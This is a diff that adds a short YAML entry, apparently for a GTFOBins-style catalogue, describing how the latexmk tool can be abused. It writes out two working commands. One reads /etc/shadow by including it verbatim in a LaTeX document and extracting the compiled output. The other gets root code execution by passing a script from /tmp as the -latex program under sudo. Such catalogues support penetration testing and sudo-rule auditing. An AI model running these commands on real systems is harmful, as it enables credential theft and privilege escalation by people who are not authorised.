@@ -1,0 +1,11 @@
+description: `latexmk` is a perl script.
+functions:
+  file-read:
+    - code: |
+        echo "\documentclass[12pt]{article} \usepackage{verbatim} \begin{document} \verbatiminput{/etc/shadow} \end{document}" > read.tex
+        latexmk read.tex
+        strings read.dvi
+  sudo:
+    - code: |
+        echo "PROGRAM > /tmp/result.txt" > /tmp/run.sh
+        sudo latexmk -latex="/tmp/run.sh" file.tex 
